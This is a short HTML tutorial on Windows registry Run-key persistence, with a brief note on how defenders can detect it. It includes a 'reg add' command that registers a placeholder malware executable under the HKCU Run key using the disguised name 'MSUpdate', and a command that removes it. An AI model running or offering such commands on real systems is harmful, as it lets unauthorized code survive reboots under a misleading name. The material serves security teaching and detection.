<h1>Registry-Key Persistence</h1>

<h2>Introduction</h2>

Registry-key persistence modifies startup-related registry entries so malicious or unauthorized binaries re-launch on boot or user login.
It's effective because it survives reboots, requires little operator effort, and often blends with legitimate startup items.

Defenders should monitor and alert on new/changed startup registry entries, verify associated binaries/owners, and block or remediate unauthorized entries.

In this type of persistence the attacker simply updates the registy hive by adding an entry in this location of the hive <mark> "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"</mark> that informs the system when ever it boots up to run the binary that has been specified
This persistence technnique also can be perfomed by any user

<h2>Abuse</h2>

▪ To set this persistence we simply need to add a registry instruction as shown below:  

<mark>reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v MSUpdate /t REG_SZ /d C:\Path\To\Malware.exe /f </mark> 

<img src="https://imgur.com/smowLsW.png" height="80%" width="80%" alt="Reg Screenshot"/>

 ▪ To remove the registry instruction:   

 <mark>reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v MSUpdate /f </mark>

 <img src="https://imgur.com/zeBDrLo.png" height="80%" width="80%" alt="Reg Screenshot"/>
